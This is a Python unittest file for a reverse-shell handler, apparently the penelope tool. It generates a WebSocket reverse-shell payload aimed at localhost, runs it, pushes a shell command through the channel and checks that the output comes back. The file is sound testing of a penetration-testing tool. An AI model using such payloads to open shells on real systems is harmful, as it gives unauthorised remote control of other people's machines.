"""
End-to-end test for the -a WebSocket revshell payload template.

Runs the generated Python payload as a subprocess against a live
WSListener, sends a shell command through the WS channel, and asserts
we see the shell's output come back. This exercises the full loop:
  payload's WS handshake -> server accept_ws -> WebSocketConn.recv/send ->
  payload's frame decoder -> subprocess sh stdin/stdout -> back through frames.

Only depends on the stdlib. No `websockets` library needed.

Run: python3 -m unittest test.test_ws_payload
"""

import os
import select as _sel
import subprocess
import sys
import threading
import unittest

_HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.dirname(_HERE))
import penelope  # noqa: E402
if not hasattr(penelope, "options") or penelope.options is None:
	penelope.options = penelope.Options()
from penelope import WSListener, WebSocketConn, _ws_python_revshell_src  # noqa: E402


class TestGeneratedWSRevshell(unittest.TestCase):

	def test_listener_payload_contract_filters_windows(self):
		lst = WSListener(host="127.0.0.1", port=0)
		try:
			self.assertEqual("", lst.payloads(target_os="windows"))
			self.assertIn("Python WebSocket", lst.payloads(target_os="linux"))
			self.assertIn("Python WebSocket", lst.payloads(target_os="both"))
		finally:
			lst.close()

	def test_payload_delivers_shell(self):
		lst = WSListener(host="127.0.0.1", port=0)
		results = {"buf": b""}

		def server():
			try:
				lst.socket.settimeout(6.0)
				raw, peer = lst.socket.accept()
				conn = lst.accept_ws(raw, peer)
				# push a command through the shell and let it exit
				outbuf = bytearray(WebSocketConn.frame(b"echo READY-SIGIL\nexit\n"))
				# drive an outbuf-style loop until we see the sigil in the reply
				deadline = 8.0
				start_r = [conn]
				while b"READY-SIGIL" not in results["buf"]:
					r, w, _ = _sel.select(start_r, [conn] if outbuf else [], [], deadline)
					if not r and not w:
						break
					if r:
						try:
							data = conn.recv(4096)
						except BlockingIOError:
							data = None
						else:
							if not data:
								break
							results["buf"] += data
					if outbuf:
						try:
							sent = conn.send(bytes(outbuf))
							del outbuf[:sent]
						except BlockingIOError:
							pass
				conn.close()
			except Exception as e:
				results["err"] = repr(e)

		t = threading.Thread(target=server); t.start()

		src = _ws_python_revshell_src("127.0.0.1", lst.port, "/", "127.0.0.1", False)
		payload = subprocess.Popen(
			[sys.executable, "-c", src],
			stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
		)

		t.join(timeout=10.0)
		try:
			payload.wait(timeout=5.0)
		except subprocess.TimeoutExpired:
			payload.kill()
			payload.wait(timeout=2.0)
		lst.close()

		self.assertNotIn("err", results, "server: %s" % results.get("err"))
		self.assertIn(b"READY-SIGIL", results["buf"],
		              "shell output missing sigil; got %r" % results["buf"][:400])


if __name__ == "__main__":
	unittest.main(verbosity=2)
